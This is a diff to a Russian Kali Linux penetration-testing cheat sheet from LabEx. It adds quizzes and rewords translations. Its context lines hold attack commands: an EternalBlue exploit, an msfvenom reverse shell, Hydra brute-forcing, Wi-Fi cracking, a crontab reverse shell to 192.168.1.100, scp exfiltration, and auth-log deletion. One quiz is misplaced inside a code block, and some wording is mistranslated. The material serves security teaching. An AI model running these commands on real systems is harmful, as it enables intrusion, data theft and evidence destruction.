@@ -1,6 +1,6 @@
 ---
-title: 'Шпаргалка по Kali Linux'
-description: 'Изучите Kali Linux с нашей подробной шпаргалкой, охватывающей основные команды, концепции и лучшие практики.'
+title: 'Шпаргалка по Kali Linux | LabEx'
+description: 'Изучите тестирование на проникновение с Kali Linux с помощью этой исчерпывающей шпаргалки. Краткий справочник по инструментам безопасности, этичному хакингу, сканированию уязвимостей, эксплуатации и тестированию кибербезопасности.'
 pdfUrl: '/cheatsheets/pdf/kali-linux-cheatsheet.pdf'
 ---
 
@@ -15,7 +15,7 @@ pdfUrl: '/cheatsheets/pdf/kali-linux-cheatsheet.pdf'
 <a target="_blank" href="https://labex.io/ru/learn/kali">Изучите Kali Linux с практическими лабораториями</a>
 </base-disclaimer-title>
 <base-disclaimer-content>
-Изучите тестирование на проникновение с помощью Kali Linux с помощью практических лабораторий и сценариев реального мира. LabEx предлагает комплексные курсы по Kali Linux, охватывающие основные команды, сетевое сканирование, оценку уязвимостей, атаки на пароли, тестирование веб-приложений и цифровую криминалистику. Освойте методы этичного хакинга и инструменты аудита безопасности.
+Изучите тестирование на проникновение с помощью Kali Linux через практические лаборатории и сценарии реального мира. LabEx предлагает комплексные курсы по Kali Linux, охватывающие основные команды, сетевое сканирование, оценку уязвимостей, атаки на пароли, тестирование веб-приложений и цифровую криминалистику. Освойте методы этичного хакинга и инструменты аудита безопасности.
 </base-disclaimer-content>
 </base-disclaimer>
 
@@ -83,7 +83,7 @@ sudo ifconfig wlan0 up
 
 ### Переменные окружения: `export`
 
-Настройка переменных окружения и путей для тестирования.
+Настройка переменных окружения и путей для тестовой среды.
 
 ```bash
 # Установить IP цели
@@ -93,6 +93,21 @@ export WORDLIST=/usr/share/wordlists/rockyou.txt
 # Просмотреть переменные окружения
 env | grep TARGET
 ```
+
+<BaseQuiz id="kali-env-1" correct="C">
+  <template #question>
+    Что происходит с переменными окружения, установленными с помощью `export`?
+  </template>
+  
+  <BaseQuizOption value="A">Они сохраняются после перезагрузки системы</BaseQuizOption>
+  <BaseQuizOption value="B">Они доступны только в текущем файле</BaseQuizOption>
+  <BaseQuizOption value="C" correct>Они доступны для текущей оболочки и дочерних процессов</BaseQuizOption>
+  <BaseQuizOption value="D">Это глобальные системные переменные</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    Переменные окружения, установленные с помощью `export`, доступны для текущей сессии оболочки и всех порожденных ею дочерних процессов. Они теряются, когда сессия оболочки завершается, если только они не добавлены в файлы конфигурации оболочки, такие как `.bashrc`.
+  </BaseQuizAnswer>
+</BaseQuiz>
 
 ### Установка инструментов: `apt install`
 
@@ -139,15 +154,46 @@ nmap -sU 192.168.1.1
 nmap -sS 192.168.1.1
 ```
 
+<BaseQuiz id="kali-nmap-1" correct="B">
+  <template #question>
+    Что делает `nmap -sS`?
+  </template>
+  
+  <BaseQuizOption value="A">Выполняет UDP-сканирование</BaseQuizOption>
+  <BaseQuizOption value="B" correct>Выполняет скрытое SYN-сканирование (полуоткрытое сканирование)</BaseQuizOption>
+  <BaseQuizOption value="C">Сканирует все порты</BaseQuizOption>
+  <BaseQuizOption value="D">Выполняет обнаружение ОС</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    Флаг `-sS` выполняет SYN-сканирование (также известное как полуоткрытое сканирование), поскольку оно никогда не завершает TCP-рукопожатие. Оно отправляет SYN-пакеты и анализирует ответы, что делает его более скрытным, чем полное TCP-соединение.
+  </BaseQuizAnswer>
+</BaseQuiz>
+
 ### Перечисление служб: `nmap -sV`
 
 Определение версий служб и потенциальных уязвимостей.
 
 ```bash
-# Определение версий
+# Обнаружение версий
 nmap -sV 192.168.1.1
-# Определение ОС
+# Обнаружение ОС
 nmap -O 192.168.1.1
+```
+
+<BaseQuiz id="kali-enumeration-1" correct="A">
+  <template #question>
+    Что делает `nmap -sV`?
+  </template>
+  
+  <BaseQuizOption value="A" correct>Обнаруживает версии служб, работающих на открытых портах</BaseQuizOption>
+  <BaseQuizOption value="B">Сканирует только порты версий</BaseQuizOption>
+  <BaseQuizOption value="C">Показывает только уязвимые службы</BaseQuizOption>
+  <BaseQuizOption value="D">Выполняет только обнаружение ОС</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    Флаг `-sV` включает обнаружение версий, которое опрашивает открытые порты для определения запущенной службы и ее версии. Это полезно для выявления потенциальных уязвимостей, связанных с конкретными версиями программного обеспечения.
+  </BaseQuizAnswer>
+</BaseQuiz>
 # Скриптовое сканирование
 nmap -sC 192.168.1.1
 # Комплексное сканирование
@@ -158,14 +204,14 @@ nmap -sS -sV -O -A 192.168.1.1
 
 ### Перечисление DNS: `dig`
 
-Сбор информации DNS и выполнение трансферов зон.
+Сбор информации DNS и выполнение зональных трансферов.
 
 ```bash
 # Базовый DNS-запрос
 dig example.com
 # Обратный DNS-запрос
 dig -x 192.168.1.1
-# Попытка трансфера зоны
+# Попытка зонального трансфера
 dig @ns1.example.com example.com axfr
 # Перечисление DNS
 dnsrecon -d example.com
@@ -176,7 +222,7 @@ dnsrecon -d example.com
 Обнаружение скрытых каталогов и файлов на веб-серверах.
 
 ```bash
-# Брутфорс каталогов
+# Перебор каталогов
 dirb http://192.168.1.1
 # Пользовательский словарь
 dirb http://192.168.1.1 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -191,7 +237,7 @@ gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-l
 ```bash
 # WHOIS-запрос
 whois example.com
-# WHOIS по IP
+# IP WHOIS
 whois 8.8.8.8
 # Комплексный сбор информации
 theharvester -d example.com -l 100 -b google
@@ -247,9 +293,9 @@ snmp-check 192.168.1.1
 ```bash
 # Запуск службы Nessus
 sudo systemctl start nessusd
-# Сканирование OpenVAS
+# Запуск сканирования OpenVAS
 openvas-start
-# Сканер уязвимостей веб-сервера Nikto
+# Сканер веб-уязвимостей Nikto
 nikto -h http://192.168.1.1
 # SQLmap для SQL-инъекций
 sqlmap -u "http://example.com/page.php?id=1"
@@ -266,7 +312,7 @@ msfconsole
 search ms17-010
 # Использование эксплойта
 use exploit/windows/smb/ms17_010_eternalblue
-# Установка цели
+# Установка RHOSTS
 set RHOSTS 192.168.1.1
 ```
 
@@ -298,14 +344,14 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > 
 
 ### Атаки перебором: `hydra`
 
-Выполнение атак методом брутфорса на различные службы.
+Выполнение атак перебором логинов против различных служб.
 
 ```bash
-# Брутфорс SSH
+# SSH перебор
 hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
-# Брутфорс HTTP-формы
+# HTTP-форма перебор
 hydra -l admin -P passwords.txt 192.168.1.1 http-form-post "/login:username=^USER^&password=^PASS^:Invalid"
-# Брутфорс FTP
+# FTP перебор
 hydra -L users.txt -P passwords.txt ftp://192.168.1.1
 ```
 
@@ -314,9 +360,9 @@ hydra -L users.txt -P passwords.txt ftp://192.168.1.1
 Взлом хешей паролей с использованием ускорения GPU.
 
 ```bash
-# Взлом хеша MD5
+# Взлом MD5-хеша
 hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
-# Взлом хеша NTLM
+# Взлом NTLM-хеша
 hashcat -m 1000 -a 0 ntlm.hash wordlist.txt
 # Генерация вариаций словаря
 hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt
@@ -324,7 +370,7 @@ hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt
 
 ### John the Ripper: `john`
 
-Традиционное взламывание паролей с различными режимами атак.
+Традиционный взлом паролей с использованием различных режимов атаки.
 
 ```bash
 # Взлом файла паролей
@@ -352,16 +398,16 @@ crunch 8 8 -t @@@@%%%% -o mixed.txt
 
 ## Тестирование безопасности беспроводных сетей
 
-### Настройка режима монитора: `airmon-ng`
+### Настройка режима мониторинга: `airmon-ng`
 
 Настройка беспроводного адаптера для захвата пакетов и инъекций.
 
 ```bash
-# Включить режим монитора
+# Включить режим мониторинга
 sudo airmon-ng start wlan0
 # Проверить конфликтующие процессы
 sudo airmon-ng check kill
-# Выключить режим монитора
+# Выключить режим мониторинга
 sudo airmon-ng stop wlan0mon
 ```
 
@@ -374,13 +420,13 @@ sudo airmon-ng stop wlan0mon
 sudo airodump-ng wlan0mon
 # Целевая сеть
 sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
-# Показать только WEP-сети
+# Показать только WEP сети
 sudo airodump-ng --encrypt WEP wlan0mon
 ```
 
 ### Атаки WPA/WPA2: `aircrack-ng`
 
-Выполнение атак на сети, зашифрованные WPA/WPA2.
+Выполнение атак против сетей, зашифрованных WPA/WPA2.
 
 ```bash
 # Атака Deauth
@@ -391,7 +437,7 @@ aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
 reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
 ```
 
-### Атака "Злой двойник": `hostapd`
+### Атака Evil Twin: `hostapd`
 
 Создание поддельных точек доступа для сбора учетных данных.
 
@@ -408,7 +454,7 @@ ettercap -T -M arp:remote /192.168.1.0/24//
 
 ### Тестирование SQL-инъекций: `sqlmap`
 
-Автоматизированное обнаружение и эксплуатация SQL-инъекций.
+Автоматическое обнаружение и эксплуатация SQL-инъекций.
 
 ```bash
 # Базовый тест SQL-инъекции
@@ -428,7 +474,7 @@ sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump
 ```bash
 # Тестирование XSS
 xsser --url "http://example.com/search.php?q=XSS"
-# Автоматизированное обнаружение XSS
+# Автоматическое обнаружение XSS
 xsser -u "http://example.com" --crawl=10
 # Пользовательская полезная нагрузка
 xsser --url "http://example.com" --payload="<script>alert(1)</script>"
@@ -442,9 +488,9 @@ xsser --url "http://example.com" --payload="<script>alert(1)</script>"
 # Запуск Burp Suite
 burpsuite
 # Настройка прокси (127.0.0.1:8080)
-# Настроить прокси браузера для перехвата трафика
-# Использовать Intruder для автоматизированных атак
-# Использовать Spider для обнаружения контента
+# Настройка прокси браузера для перехвата трафика
+# Использование Intruder для автоматизированных атак
+# Spider для обнаружения контента
 ```
 
 ### Обход каталогов: `wfuzz`
@@ -452,24 +498,24 @@ burpsuite
 Тестирование на уязвимости обхода каталогов и включения файлов.
 
 ```bash
-# Fuzzing каталогов
+# Перебор каталогов
 wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.1.1/FUZZ
-# Fuzzing параметров
+# Перебор параметров
 wfuzz -c -z file,payloads.txt "http://example.com/page.php?file=FUZZ"
 ```
 
 ## Постэксплуатация и повышение привилегий
 
-### Перечисление системы: `linpeas`
+### Системное перечисление: `linpeas`
 
-Автоматизированный сбор информации для повышения привилегий в Linux.
+Автоматизированный перебор для повышения привилегий в Linux.
 
 ```bash
-# Загрузить LinPEAS
+# Загрузка LinPEAS
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 # Сделать исполняемым
 chmod +x linpeas.sh
-# Запустить перечисление
+# Запуск перечисления
 ./linpeas.sh
 # Альтернатива для Windows: winPEAS.exe
 ```
@@ -479,7 +525,7 @@ chmod +x linpeas.sh
 Установление постоянного доступа в скомпрометированных системах.
 
 ```bash
-# Редактировать crontab
+# Редактирование crontab
 crontab -e
 # Добавить обратный шелл
 @reboot /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
@@ -489,7 +535,7 @@ echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
 
 ### Эксфильтрация данных: `scp`
 
-Безопасная передача данных с скомпрометированных систем.
+Безопасная передача данных из скомпрометированных систем.
 
 ```bash
 # Скопировать файл на машину атакующего
@@ -519,7 +565,7 @@ sudo rm /var/log/auth.log*
 
 ### Образ диска: `dd`
 
-Создание криминалистических образов накопителей.
+Создание криминалистических образов устройств хранения данных.
 
 ```bash
 # Создать образ диска
@@ -560,7 +606,7 @@ volatility -f memory.dump --profile=Win7SP1x64 procdump -p 1234 -D output/
 
 ### Анализ сетевых пакетов: `wireshark`
 
-Анализ захваченного сетевого трафика для криминалистических улик.
+Анализ захваченного сетевого трафика на предмет криминалистических улик.
 
 ```bash
 # Запуск Wireshark
@@ -578,11 +624,11 @@ foremost -i capture.pcap -o extracted/
 Документирование результатов с помощью систематического захвата скриншотов.
 
 ```bash
-# Скриншот всего экрана
+# Захват всего экрана
 gnome-screenshot -f screenshot.png
-# Скриншот окна
+# Захват окна
 gnome-screenshot -w -f window.png
-# Задержка скриншота
+# Захват с задержкой
 gnome-screenshot -d 5 -f delayed.png
 # Выбор области
 gnome-screenshot -a -f area.png
@@ -597,7 +643,7 @@ gnome-screenshot -a -f area.png
 script session.log
 # Запись с таймингом
 script -T session.time session.log
-# Повтор сеанса
+# Повторное воспроизведение сеанса
 scriptreplay session.time session.log
 ```
 
@@ -614,9 +660,9 @@ python3 generate_report.py
 pandoc report.md -o report.pdf
 ```
 
-### Целостность доказательств: `sha256sum`
+### Целостность улик: `sha256sum`
 
-Поддержание цепочки хранения с помощью криптографических хешей.
+Поддержание цепочки владения с помощью криптографических хешей.
 
 ```bash
 # Генерация контрольных сумм
@@ -646,12 +692,12 @@ sudo apt autoremove
 
 ### Обновления ядра: `uname`
 
-Мониторинг и обновление ядра системы для исправлений безопасности.
+Мониторинг и обновление системного ядра для исправлений безопасности.
 
 ```bash
 # Проверить текущее ядро
 uname -r
-# Показать доступные ядра
+# Показать доступные для обновления ядра
 apt list --upgradable | grep linux-image
 # Установить новое ядро
 sudo apt install linux-image-generic
@@ -668,7 +714,7 @@ sudo apt autoremove --purge
 which nmap
 # Проверить наличие инструмента
 command -v metasploit
-# Показать все инструменты в каталоге
+# Список всех инструментов в каталоге
 ls /usr/bin/ | grep -i security
 ```
 
@@ -691,7 +737,7 @@ netstat -tulnp
 
 ### Создание псевдонимов: `.bashrc`
 
-Настройка сокращений команд для экономии времени при выполнении частых задач.
+Настройка сочетаний клавиш для экономии времени при выполнении частых задач.
 
 ```bash
 # Редактировать bashrc
@@ -710,11 +756,11 @@ source ~/.bashrc
 Создание расширенных комбинаций команд для общих рабочих процессов.
 
 ```bash
-# Функция быстрого nmap-сканирования
+# Быстрое nmap-сканирование
 function qscan() {
     nmap -sS -sV -O $1
 }
-# Настройка каталогов для проектов
+# Настройка для пентеста
 function pentest-setup() {
     mkdir -p {recon,scans,exploits,loot}
 }
@@ -731,7 +777,7 @@ function pentest-setup() {
 # Ctrl+L - Очистить экран
 # Ctrl+R - Поиск в истории команд
 # Tab - Автодополнение команд
-# Up/Down - Перемещение по истории команд
+# Up/Down - Навигация по истории команд
 ```
 
 ### Конфигурация окружения: `tmux`
@@ -739,9 +785,9 @@ function pentest-setup() {
 Настройка постоянных сеансов терминала для длительных задач.
 
 ```bash
-# Запуск новой сессии
+# Начать новую сессию
 tmux new-session -s pentest
-# Отсоединиться от сессии
+# Отключиться от сессии
 # Ctrl+B, D
 # Список сессий
 tmux list-sessions
@@ -749,7 +795,7 @@ tmux list-sessions
 tmux attach -t pentest
 ```
 
-## Связанные ссылки
+## Соответствующие ссылки
 
 - <router-link to="/linux">Шпаргалка по Linux</router-link>
 - <router-link to="/shell">Шпаргалка по Shell</router-link>
